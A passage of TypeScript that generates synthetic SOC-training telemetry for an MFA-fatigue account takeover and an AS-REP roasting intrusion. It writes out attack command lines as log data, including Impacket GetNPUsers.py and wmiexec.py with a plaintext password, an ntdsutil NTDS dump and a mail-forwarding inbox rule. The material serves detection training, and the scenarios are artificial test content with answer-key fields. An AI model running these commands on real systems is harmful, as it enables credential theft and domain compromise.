        "azure.role.name": "Conditional Access Administrator", "azure.target.upn": EMAIL, "azure.actor.upn": "it.admin@nexacorp.com", "data.office365.ResultStatus": "Success",
      },
    },
    {
      id: "mfa_00c_baseline_signin", ts: "2026-06-12T08:41:00.000Z", source: "okta", vendor: "Okta", event_type: "auth_success", severity: "informational",
      is_baseline: true, expected_verdict: "informational", hostname: IDP, user_email: EMAIL, src_ip: "217.177.80.10",
      description: "j.chen's usual Okta sign-in on Friday morning from the London office, Chrome on Windows.",
      raw: {
        "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS", "okta.actor.displayName": "Jennifer Chen", "okta.client.ipAddress": "217.177.80.10",
        "okta.client.userAgent.rawUserAgent": CHROME,
      },
    },

    // ── Password guessing, then the first factor passes ──
    ...failures,
    okta("mfa_02_first_factor_passed", 1 * MIN + 17 * SEC, "policy.evaluate_sign_on", "CHALLENGE", "mfa_challenge", "medium", PY, {},
      { mitre_technique: "T1078.004", description: "The tenth password attempt from the same address matched; the sign-on policy answered CHALLENGE and Okta asked for MFA." }),

    // ── MFA fatigue: 24 pushes, 12 denied, 11 ignored, the last approved ──
    ...pushes,
    okta("mfa_04_push_approved", 12 * MIN + 17 * SEC, "user.authentication.auth_via_mfa", "SUCCESS", "auth_success", "critical", PY,
      { ...PUSH, "okta.debugContext.debugData.pushOnlyResponseType": "OV_RESPONSE_APPROVE" },
      { mitre_technique: "T1621", description: "j.chen approved the 24th Okta Verify push, 11 minutes after the first, and the MFA step completed." }),
    okta("mfa_04b_session_start", 12 * MIN + 18 * SEC, "user.session.start", "SUCCESS", "auth_success", "high", PY, { ...PUSH },
      { description: "Okta opened a session for j.chen from the Moscow address one second after the approval." }),

    // ── Persistence: a new device, then the Microsoft 365 session ──
    okta("mfa_05_device_enroll", 12 * MIN + 44 * SEC, "device.enrollment.create", "SUCCESS", "account_modify", "critical", CHROME, {
      "okta.target.0.displayName": "DESKTOP-MOSCOW-99", "okta.target.0.type": "EnrolledDevice", "okta.target.0.detailEntry.platform": "WINDOWS",
      "okta.target.0.detailEntry.managed": false, "okta.target.0.detailEntry.registered": T(12 * MIN + 44 * SEC),
    }, { mitre_technique: "T1098.005", description: "A Windows device named DESKTOP-MOSCOW-99 was enrolled as a factor on j.chen's Okta account 27 seconds after the push was approved." }),
    okta("mfa_05a_okta_sso_o365", 13 * MIN + 10 * SEC, "user.authentication.sso", "SUCCESS", "auth_success", "medium", CHROME, {
      "okta.target.displayName": "Microsoft Office 365",
    }, { description: "j.chen's Okta session single-signed-on to the Microsoft Office 365 app from 91.108.4.33." }),
    entraSignIn,
    ...mailBatches,
    ...files,

    // ── Persistence and defence impairment with the standing admin roles ──
    okta("mfa_08_api_token", 20 * MIN, "system.api_token.create", "SUCCESS", "cloud_api_call", "high", CHROME, {
      "okta.target.displayName": "j.chen-api-token-2026", "okta.target.type": "Token", "okta.debugContext.debugData.tokenExpiry": "never",
    }, { mitre_technique: "T1098.001", description: "An Okta API token named j.chen-api-token-2026 was created with no expiration date, from the same Russian IP, by an account holding the Org Administrator role." }),
    {
      id: "mfa_09_ca_policy",
      ts: T(22 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "policy_modification", severity: "critical", mitre_technique: "T1556.009",
      hostname: "aad.nexacorp.com", user_email: EMAIL, src_ip: ATT,
      // Okta is the IdP; Microsoft 365 is federated to it, and the M365 tenant
      // still enforces its own Entra Conditional Access after the Okta SSO.
      description: "In the Okta-federated Microsoft 365 tenant, j.chen's account (Conditional Access Administrator) modified the Require Compliant Device Conditional Access policy to add DESKTOP-MOSCOW-99 to its device exclusion list, from 91.108.4.33.",
      raw: {
        "data.office365.Operation": "Update conditional access policy.",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.UserId": EMAIL,
        "data.office365.ActorIpAddress": ATT,
        "data.office365.Target[0].ID": "Require Compliant Device",
        "data.office365.ModifiedProperties[0].Name": "ExcludeDevices",
        "data.office365.ModifiedProperties[0].NewValue": "[\"DESKTOP-MOSCOW-99\"]",
        "data.office365.ModifiedProperties[0].OldValue": "[]",
        "data.office365.ResultStatus": "Success",
        "GeoLocation.country_name": "Russia",
      },
    },
    {
      id: "mfa_10_inbox_rule",
      ts: T(24 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "account_modify", severity: "high", mitre_technique: "T1114.003",
      hostname: "outlook.office365.com", user_email: EMAIL, src_ip: ATT,
      description: "An inbox rule forwarding all of j.chen's email to j.chen.backup@proton.me and marking it as read was created.",
      raw: {
        "data.office365.Operation": "New-InboxRule",
        "data.office365.UserId": EMAIL,
        "data.office365.Workload": "Exchange",
        "data.office365.ClientIPAddress": ATT,
        "data.office365.Parameters[0].Name": "ForwardTo",
        "data.office365.Parameters[0].Value": "j.chen.backup@proton.me",
        "data.office365.Parameters[1].Name": "MarkAsRead",
        "data.office365.Parameters[1].Value": "True",
        "GeoLocation.country_name": "Russia",
      },
    },

    // ── Detection: a Sentinel analytics rule over the Okta log, as the SecurityAlert row it writes ──
    {
      id: "mfa_11_correlation",
      ts: T(25 * MIN),
      source: "siem", vendor: "Microsoft Sentinel",
      event_type: "ueba_anomaly", severity: "high", is_detection: true, mitre_technique: "T1621", mitre_tactic: "Credential Access",
      hostname: IDP, user_email: EMAIL, src_ip: ATT,
      description: "Microsoft Sentinel raised 'MFA fatigue followed by successful sign-in' for j.chen from the Okta System Log.",
      raw: {
        "TimeGenerated": T(25 * MIN),
        "AlertName": "MFA fatigue followed by successful sign-in",
        "AlertSeverity": "High",
        "ProviderName": "ASI Scheduled Alerts",
        "ProductName": "Azure Sentinel",
        "VendorName": "Microsoft",
        "SystemAlertId": "c0a3e1d7-52b4-4a9e-8f16-7d2b94e0a5c3",
        "Status": "New",
        "StartTime": T(0),
        "EndTime": T(12 * MIN + 44 * SEC),
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1621\"]",
        "CompromisedEntity": EMAIL,
        "Entities": JSON.stringify([
          { $id: "2", Name: "j.chen", UPNSuffix: "nexacorp.com", Type: "account" },
          { $id: "3", Address: ATT, Type: "ip" },
        ]),
        "ExtendedProperties.Failed Sign-ins": "9",
        "ExtendedProperties.Push Notifications Sent": "24",
        "ExtendedProperties.Push Denied": "12",
        "ExtendedProperties.Push Approved": "1",
        "ExtendedProperties.Source IP": ATT,
        "ExtendedProperties.Source Country": "Russia",
        "ExtendedProperties.Window": "2026-06-15 01:20 to 01:33 UTC",
      },
    },
  ];

  return { title: "Overnight high-severity alert on an IT administrator", events, T, MIN };
}

/** Telemetry half of `buildAsRepRoastingScenario`: the events and the story title, no answer key. */
export function asRepRoastingScenarioEvents() {
  // The Python interpreter hosting the Impacket module: the one artefact in an
  // otherwise entirely internal AD attack that an analyst can actually look up.
  const pyHash = makeSha256("python_exe_impacket_host");
  const B = new Date("2026-05-11T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HOUR = 60 * MIN;
  const SEC = 1_000;

  const WS = "WS-DEV-09", WS_IP = "10.0.1.45";
  const DC = "DC01", DC_IP = "10.0.0.5";
  const FS = "SRV-FILE01", FS_IP = "10.0.2.20";
  const JOHNSON = "m.johnson@nexacorp.com";
  const SVC = "svc-backup@nexacorp.com";
  const TMP = "C:\\Users\\m.johnson\\AppData\\Local\\Temp";
  const PY_PATH = "C:\\Users\\m.johnson\\AppData\\Local\\Programs\\Python\\Python312\\python.exe";
  const PY_SIGN = { "process.code_signature.exists": true, "process.code_signature.trusted": true, "process.code_signature.subject_name": "Python Software Foundation" };
  const NL = "\r\n\t\t\t";

  // A Falcon process row on one of the three hosts.
  const cs = (id: string, t: number, host: string, ip: string, user_email: string | undefined, p: NonNullable<TelemetryEvent["process"]>,
    severity: TelemetryEvent["severity"], extra: Record<string, unknown> = {}, more: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create", severity,
    hostname: host, src_ip: ip, ...(user_email ? { user_email } : {}), process: p,
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", ...extra }, ...more,
  });
  // A Falcon outbound connection row.
  const net = (id: string, t: number, host: string, ip: string, user_email: string, p: NonNullable<TelemetryEvent["process"]>, dst: string, srcPort: number, dstPort: number,
    description: string): TelemetryEvent => ({
    id, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection", severity: "medium",
    hostname: host, src_ip: ip, user_email, dst_ip: dst, src_port: srcPort, dst_port: dstPort, protocol: "tcp", process: p, description,
    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4" },
  });
  // A FortiGate forward-traffic row for one TCP session between the workstation and a server.
  const fw = (id: string, t: number, dst: string, dstName: string, srcPort: number, dstPort: number, app: string, sent: number, rcvd: number, duration: number): TelemetryEvent => ({
    id, ts: T(t), source: "firewall", vendor: "FortiGate", event_type: "net_connection", severity: "low",
    hostname: WS, src_ip: WS_IP, dst_ip: dst, src_port: srcPort, dst_port: dstPort, protocol: "tcp",
    network: { bytes_out: sent, bytes_in: rcvd },
    description: `${WS} opened a ${app} session from port ${srcPort} to ${dstName} (${dst}) on port ${dstPort}; ${sent} bytes sent, ${rcvd} bytes received.`,
    raw: {
      "data.type": "traffic", "data.subtype": "forward", "data.action": "close", "data.srcip": WS_IP, "data.dstip": dst, "data.srcport": String(srcPort),
      "data.dstport": String(dstPort), "data.proto": "6", "data.app": app, "data.sentbyte": sent, "data.rcvdbyte": rcvd, "data.duration": duration,
    },
  });

  // Process identities (one pid per process, distinct pids for the same image).
  const userinit = { name: "userinit.exe", pid: 3160, path: "C:\\Windows\\System32\\userinit.exe", parent_name: "winlogon.exe", parent_pid: 732, cmdline: "C:\\Windows\\system32\\userinit.exe", user: "NEXACORP\\m.johnson" };
  const explorer = { name: "explorer.exe", pid: 5320, path: "C:\\Windows\\explorer.exe", parent_name: "userinit.exe", parent_pid: 3160, cmdline: "C:\\Windows\\Explorer.EXE", user: "NEXACORP\\m.johnson" };
  const cmdWs = { name: "cmd.exe", pid: 6104, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "explorer.exe", parent_pid: 5320, cmdline: "\"C:\\Windows\\System32\\cmd.exe\"", user: "NEXACORP\\m.johnson" };
  const psWs = { name: "powershell.exe", pid: 7040, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_name: "cmd.exe", parent_pid: 6104,
    cmdline: `powershell.exe -c "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Select-Object -ExpandProperty samaccountname | Out-File ${TMP}\\users.txt"`, user: "NEXACORP\\m.johnson" };
  const GETNP_CMD = `python.exe ${TMP}\\impacket\\GetNPUsers.py nexacorp.com/ -no-pass -usersfile ${TMP}\\users.txt -format hashcat -outputfile ${TMP}\\asrep_hashes.txt`;
  const pyRoast = { name: "python.exe", pid: 7716, path: PY_PATH, parent_name: "cmd.exe", parent_pid: 6104, cmdline: GETNP_CMD, user: "NEXACORP\\m.johnson", hash: { sha256: pyHash } };
  const wmiexecFs = { name: "python.exe", pid: 8120, path: PY_PATH, parent_name: "cmd.exe", parent_pid: 6104,
    cmdline: `python.exe ${TMP}\\impacket\\wmiexec.py nexacorp.com/svc-backup:Backup2023!@${FS_IP}`, user: "NEXACORP\\m.johnson", hash: { sha256: pyHash } };
  const wmiexecDc = { name: "python.exe", pid: 8161, path: PY_PATH, parent_name: "cmd.exe", parent_pid: 6104,
    cmdline: `python.exe ${TMP}\\impacket\\wmiexec.py nexacorp.com/svc-backup:Backup2023!@${DC_IP}`, user: "NEXACORP\\m.johnson", hash: { sha256: pyHash } };
  const wmiFs = { name: "WmiPrvSE.exe", pid: 3716, path: "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", parent_name: "svchost.exe", parent_pid: 936, cmdline: "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding", user: "NT AUTHORITY\\NETWORK SERVICE" };
  const cmdFs = { name: "cmd.exe", pid: 11392, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "WmiPrvSE.exe", parent_pid: 3716,
    cmdline: "cmd.exe /Q /c net group \"Domain Admins\" /domain 1> \\\\127.0.0.1\\ADMIN$\\__1778511900.37 2>&1", user: "NEXACORP\\svc-backup" };
  const wmiDc = { name: "WmiPrvSE.exe", pid: 3320, path: "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", parent_name: "svchost.exe", parent_pid: 912, cmdline: "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding", user: "NT AUTHORITY\\NETWORK SERVICE" };
  const cmdDc = { name: "cmd.exe", pid: 6388, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "WmiPrvSE.exe", parent_pid: 3320,
    cmdline: "cmd.exe /Q /c ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q 1> \\\\127.0.0.1\\ADMIN$\\__1778512790.12 2>&1", user: "NEXACORP\\svc-backup" };
  const ntdsutil = { name: "ntdsutil.exe", pid: 6412, path: "C:\\Windows\\System32\\ntdsutil.exe", parent_name: "cmd.exe", parent_pid: 6388,
    cmdline: "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q", user: "NEXACORP\\svc-backup" };
  const cmdDc2 = { name: "cmd.exe", pid: 6544, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "WmiPrvSE.exe", parent_pid: 3320,
    cmdline: "cmd.exe /Q /c powershell -c \"Compress-Archive -Path C:\\Temp\\ntds_dump\\* -DestinationPath C:\\Temp\\ntds.zip\" 1> \\\\127.0.0.1\\ADMIN$\\__1778512790.12 2>&1", user: "NEXACORP\\svc-backup" };
  const psDc = { name: "powershell.exe", pid: 6580, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_name: "cmd.exe", parent_pid: 6544,
    cmdline: "powershell -c \"Compress-Archive -Path C:\\Temp\\ntds_dump\\* -DestinationPath C:\\Temp\\ntds.zip\"", user: "NEXACORP\\svc-backup" };

  // The three AS exchanges: the tool, the DC's 4768, the firewall's TCP/88 sessions and the endpoint's connections all share the source ports.
  const roast = [
    { n: 1, user: "svc-backup", port: 52341, t: 2 * MIN },
    { n: 2, user: "svc-monitoring", port: 52342, t: 2 * MIN + 400 },
    { n: 3, user: "svc-reports", port: 52343, t: 2 * MIN + 800 },
  ];
  const roastEvents: TelemetryEvent[] = roast.flatMap(r => [
    net(`asrep_05a_kerberos_connect_${r.n}`, r.t - 100, WS, WS_IP, JOHNSON, pyRoast, DC_IP, r.port, 88,
      `python.exe on ${WS} opened a TCP session from port ${r.port} to ${DC}:88 (Kerberos).`),
    {
      id: `asrep_0${r.n + 1}_asrep_${r.user.replace("svc-", "svc")}`, ts: T(r.t),
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt", severity: "high", ...(r.n === 1 ? { mitre_technique: "T1558.004" } : {}),
      hostname: DC, user_email: `${r.user}@nexacorp.com`, src_ip: WS_IP,
      description: `${DC} logged a Kerberos TGT request (4768) for ${r.user} from ${WS_IP} port ${r.port} with PreAuthType 0 and ticket encryption 0x17.`,
      raw: {
        "event.code": "4768", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": DC,
        "winlog.event_data.TargetUserName": r.user, "winlog.event_data.TargetDomainName": "NEXACORP", "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketEncryptionType": "0x17", "winlog.event_data.TicketOptions": "0x50800000", "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "0", "winlog.event_data.IpAddress": WS_IP, "winlog.event_data.IpPort": String(r.port),
      },
    } as TelemetryEvent,
    fw(`asrep_06_kerberos_fw_${r.n}`, r.t + 1 * SEC, DC_IP, DC, r.port, 88, "Kerberos", 214 + r.n * 3, 1412 + r.n * 11, 0),
  ]);

  const events: TelemetryEvent[] = [
    // ── Foothold: the interactive session every later workstation row hangs off ──
    // A console logon: no remote peer, so IpAddress is "-" and the logon runs under winlogon.
    {
      id: "asrep_00_logon",
      ts: T(-25 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      hostname: WS, user_email: JOHNSON,
      description: "m.johnson logged on interactively (Type 2) to WS-DEV-09.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": WS,
        "winlog.event_data.TargetUserName": "m.johnson",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.WorkstationName": WS,
        "winlog.event_data.ProcessId": "0x2dc",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        "winlog.event_data.IpAddress": "127.0.0.1",
        "winlog.event_data.IpPort": "0",
      },
    },
    cs("asrep_00a_userinit", -25 * MIN + 3 * SEC, WS, WS_IP, JOHNSON, userinit, "informational"),
    cs("asrep_00b_explorer", -25 * MIN + 5 * SEC, WS, WS_IP, JOHNSON, explorer, "informational"),
    cs("asrep_00c_cmd", -8 * MIN, WS, WS_IP, JOHNSON, cmdWs, "informational"),

    // ── Discovery: the accounts with pre-authentication disabled are listed from the directory ──
    cs("asrep_04a_discovery_ps", -4 * MIN - 20 * SEC, WS, WS_IP, JOHNSON, psWs, "medium", {},
      { mitre_technique: "T1087.002", description: "powershell.exe on WS-DEV-09 ran Get-ADUser with a userAccountControl filter for accounts that do not require Kerberos pre-authentication and wrote the names to users.txt." }),
    net("asrep_04b_discovery_adws", -4 * MIN - 19 * SEC, WS, WS_IP, JOHNSON, psWs, DC_IP, 50412, 9389,
      "powershell.exe on WS-DEV-09 connected to DC01 on 9389 (Active Directory Web Services)."),

    // ── The tool: the process that issues the AS requests starts before the DC logs the first of them ──
    cs("asrep_05_impacket_tool", 1 * MIN + 50 * SEC, WS, WS_IP, JOHNSON, pyRoast, "high", PY_SIGN, {
      mitre_technique: "T1558.004",
      description: "python.exe on WS-DEV-09 ran GetNPUsers.py under m.johnson against nexacorp.com, with an output file in m.johnson's Temp folder.",
      fp_explanation: "Python scripts run constantly on developer machines. 'GetNPUsers' isn't a well-known household tool name; many junior analysts don't recognize it as an Impacket attack module.",
    }),
    ...roastEvents,

    // ── First alert: Defender for Identity, after the three AS exchanges it reports ──
    // The directory-side evidence a SOC really gets is the identity sensor's alert on the AS
    // exchanges themselves, shown as it lands in the SIEM (SecurityAlert): the alert name and
    // its entities (source computer, source address, the accounts targeted).
    {
      id: "asrep_01_mdi_alert",
      ts: T(3 * MIN + 10_000),
      source: "ad", vendor: "Microsoft Defender for Identity",
      event_type: "ids_signature", severity: "high", mitre_technique: "T1558.004", mitre_tactic: "Credential Access",
      is_detection: true,
      hostname: WS, src_ip: WS_IP,
      description: "Defender for Identity raised 'Suspected AS-REP Roasting attack' with source WS-DEV-09 (10.0.1.45) and target accounts svc-backup, svc-monitoring and svc-reports.",
      raw: {
        "TimeGenerated": T(3 * MIN + 10_000),
        "AlertName": "Suspected AS-REP Roasting attack",
        "AlertSeverity": "High",
        "ProductName": "Azure Advanced Threat Protection",
        "VendorName": "Microsoft",
        "SystemAlertId": "6f1c2b7e-4a9d-4e31-9b52-0c8e7d14a3f6",
        "Status": "New",
        "StartTime": T(2 * MIN),
        "EndTime": T(2 * MIN + 1 * SEC),
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": WS,
        "Entities": JSON.stringify([
          { $id: "2", HostName: WS, DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Address: WS_IP, Type: "ip" },
          { $id: "4", Name: "svc-backup", NTDomain: "NEXACORP", Type: "account" },
          { $id: "5", Name: "svc-monitoring", NTDomain: "NEXACORP", Type: "account" },
          { $id: "6", Name: "svc-reports", NTDomain: "NEXACORP", Type: "account" },
          { $id: "7", HostName: DC, DnsDomain: "nexacorp.com", Type: "host" },
        ]),
      },
    },

    // ── Six hours later: the cracked svc-backup password is used from the same workstation ──
    cs("asrep_06a_wmiexec_fileserver", 5 * HOUR + 59 * MIN + 50 * SEC, WS, WS_IP, JOHNSON, wmiexecFs, "high", PY_SIGN, {
      mitre_technique: "T1021.002",
      description: "python.exe on WS-DEV-09 ran wmiexec.py with the credentials nexacorp.com/svc-backup against 10.0.2.20 (SRV-FILE01).",
    }),
    net("asrep_06b_wmiexec_dcom", 5 * HOUR + 59 * MIN + 55 * SEC, WS, WS_IP, JOHNSON, wmiexecFs, FS_IP, 54210, 135,
      "python.exe on WS-DEV-09 connected to SRV-FILE01 on 135 (RPC endpoint mapper / DCOM)."),
    fw("asrep_06c_fw_fileserver_rpc", 5 * HOUR + 59 * MIN + 56 * SEC, FS_IP, FS, 54210, 135, "DCE/RPC", 1180, 2410, 2),
    net("asrep_06d_wmiexec_smb", 6 * HOUR, WS, WS_IP, JOHNSON, wmiexecFs, FS_IP, 54219, 445,
      "python.exe on WS-DEV-09 connected to SRV-FILE01 on 445 (SMB)."),
    fw("asrep_06e_fw_fileserver_smb", 6 * HOUR + 1 * SEC, FS_IP, FS, 54219, 445, "SMB", 9120, 14260, 316),
    {
      id: "asrep_07a_ntlm_validation", ts: T(6 * HOUR + 200),
      source: "ad", vendor: "Windows Security", event_type: "auth_success", severity: "high",
      hostname: DC, user_email: SVC,
      description: "DC01 validated svc-backup's NTLM credentials (4776, status 0x0) for a logon request that came from workstation WS-DEV-09.",
      raw: {
        "event.code": "4776", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": DC,
        "winlog.event_data.PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.Workstation": WS, "winlog.event_data.Status": "0x0",
      },
    },
    {
      id: "asrep_07_lateral_svcbackup",
      ts: T(6 * HOUR + 500),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078.002",
      hostname: FS, user_email: SVC, src_ip: WS_IP,
      description: "svc-backup authenticated to SRV-FILE01 via a network logon (Type 3) originating from WS-DEV-09.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": FS,
        "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": WS,
        "winlog.event_data.IpAddress": WS_IP,
        "winlog.event_data.IpPort": "54219",
      },
    },
    {
      id: "asrep_08_sebackupprivilege",
      ts: T(6 * HOUR + 1 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "privileged_operation", severity: "critical", mitre_technique: "T1078.002",
      hostname: FS, user_email: SVC,
      description: "The svc-backup logon session on SRV-FILE01 was assigned SeBackupPrivilege, SeRestorePrivilege, and SeCreateSymbolicLinkPrivilege.",
      raw: {
        "event.code": "4672",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": FS,
        "winlog.event_data.SubjectUserName": "svc-backup",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.PrivilegeList": `SeBackupPrivilege${NL}SeRestorePrivilege${NL}SeCreateSymbolicLinkPrivilege`,
      },
    },

    // ── Discovery on the file server, run through the WMI shell ──
    cs("asrep_09a_wmiprvse_fs", 6 * HOUR + 4 * MIN + 58 * SEC, FS, FS_IP, undefined, wmiFs, "informational"),
    cs("asrep_09_domain_admin_enum", 6 * HOUR + 5 * MIN, FS, FS_IP, SVC, cmdFs, "high", {}, {
      mitre_technique: "T1087.002",
      description: "svc-backup ran net group \"Domain Admins\" /domain on SRV-FILE01 through a WMI-spawned cmd.exe.",
    }),
    cs("asrep_09b_net_exe", 6 * HOUR + 5 * MIN + 400, FS, FS_IP, SVC, { name: "net.exe", pid: 11408, path: "C:\\Windows\\System32\\net.exe", parent_name: "cmd.exe", parent_pid: 11392,
      cmdline: "net group \"Domain Admins\" /domain", user: "NEXACORP\\svc-backup" }, "high"),
    {
      id: "asrep_09c_admin_share_read", ts: T(6 * HOUR + 5 * MIN + 2 * SEC),
      source: "ad", vendor: "Windows Security", event_type: "file_access", severity: "medium",
      hostname: FS, user_email: SVC, src_ip: WS_IP,
      description: "svc-backup read a file on the SRV-FILE01 ADMIN$ share from 10.0.1.45; the name is the Unix timestamp of the command.",
      raw: {
        "event.code": "5145", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": FS,
        "winlog.event_data.SubjectUserName": "svc-backup", "winlog.event_data.SubjectDomainName": "NEXACORP", "winlog.event_data.IpAddress": WS_IP, "winlog.event_data.IpPort": "54219",
        "winlog.event_data.ShareName": "\\\\*\\ADMIN$", "winlog.event_data.RelativeTargetName": "__1778511900.37",
      },
    },
    {
      id: "asrep_09d_edr_wmiexec_alert", ts: T(6 * HOUR + 5 * MIN + 5 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert", severity: "high", is_detection: true, mitre_technique: "T1021.002",
      hostname: FS, src_ip: FS_IP, user_email: SVC, process: cmdFs,
      description: "Falcon raised a High detection on SRV-FILE01: cmd.exe launched by WmiPrvSE.exe with its output redirected to the ADMIN$ share of the host itself.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.DetectName": "WmiRemoteShellOutputRedirect",
        "crowdstrike.DetectDescription": "A remote WMI command shell wrote its output to a file on the local ADMIN$ share.",
        "crowdstrike.SeverityName": "High", "crowdstrike.Tactic": "Execution", "crowdstrike.Technique": "Remote Services",
        "threat.technique.id": "T1021", "crowdstrike.PatternDispositionDescription": "Detection, No Action",
        "crowdstrike.FileName": "cmd.exe", "crowdstrike.ParentImageFileName": "WmiPrvSE.exe", "crowdstrike.GrandparentImageFileName": "svchost.exe",
      },
    },

    // ── The domain controller: logon, privileges, then the NTDS snapshot ──
    cs("asrep_09e_wmiexec_dc", 6 * HOUR + 11 * MIN + 50 * SEC, WS, WS_IP, JOHNSON, wmiexecDc, "high", PY_SIGN, {
      mitre_technique: "T1021.002",
      description: "python.exe on WS-DEV-09 ran wmiexec.py with the credentials nexacorp.com/svc-backup against 10.0.0.5 (DC01).",
    }),
    net("asrep_09f_wmiexec_dc_smb", 6 * HOUR + 11 * MIN + 58 * SEC, WS, WS_IP, JOHNSON, wmiexecDc, DC_IP, 54377, 445,
      "python.exe on WS-DEV-09 connected to DC01 on 445 (SMB)."),
    fw("asrep_09g_fw_dc_smb", 6 * HOUR + 11 * MIN + 59 * SEC, DC_IP, DC, 54377, 445, "SMB", 8934, 13876, 1004),
    {
      id: "asrep_09h_dc_ntlm_validation", ts: T(6 * HOUR + 12 * MIN + 200),
      source: "ad", vendor: "Windows Security", event_type: "auth_success", severity: "high",
      hostname: DC, user_email: SVC,
      description: "DC01 validated svc-backup's NTLM credentials (4776, status 0x0) for a request from workstation WS-DEV-09.",
      raw: {
        "event.code": "4776", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": DC,
        "winlog.event_data.PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.Workstation": WS, "winlog.event_data.Status": "0x0",
      },
    },
    {
      id: "asrep_09b_dc_logon",
      ts: T(6 * HOUR + 12 * MIN + 500),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078",
      hostname: DC, user_email: SVC, src_ip: WS_IP,
      description: "svc-backup authenticated to DC01 with a network logon (Type 3) from WS-DEV-09.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": DC,
        "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": WS,
        "winlog.event_data.IpAddress": WS_IP,
        "winlog.event_data.IpPort": "54377",
      },
    },
    {
      id: "asrep_09i_dc_privileges", ts: T(6 * HOUR + 12 * MIN + 600),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation", severity: "critical", mitre_technique: "T1078.002",
      hostname: DC, user_email: SVC,
      description: "The svc-backup logon on DC01 was assigned SeBackupPrivilege and SeRestorePrivilege, the privileges Backup Operators members receive at logon.",
      raw: {
        "event.code": "4672", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": DC,
        "winlog.event_data.SubjectUserName": "svc-backup", "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.PrivilegeList": `SeBackupPrivilege${NL}SeRestorePrivilege`,
      },
    },
    cs("asrep_09j_wmiprvse_dc", 6 * HOUR + 19 * MIN + 48 * SEC, DC, DC_IP, undefined, wmiDc, "informational"),
    cs("asrep_09k_cmd_dc", 6 * HOUR + 19 * MIN + 50 * SEC, DC, DC_IP, SVC, cmdDc, "high"),
    cs("asrep_09l_ntdsutil", 6 * HOUR + 19 * MIN + 51 * SEC, DC, DC_IP, SVC, ntdsutil, "high", {}, { mitre_technique: "T1003.003",
      description: "ntdsutil.exe on DC01 started an IFM create full snapshot into C:\\Temp\\ntds_dump under svc-backup." }),
    {
      id: "asrep_10_ntds_dump",
      ts: T(6 * HOUR + 20 * MIN),
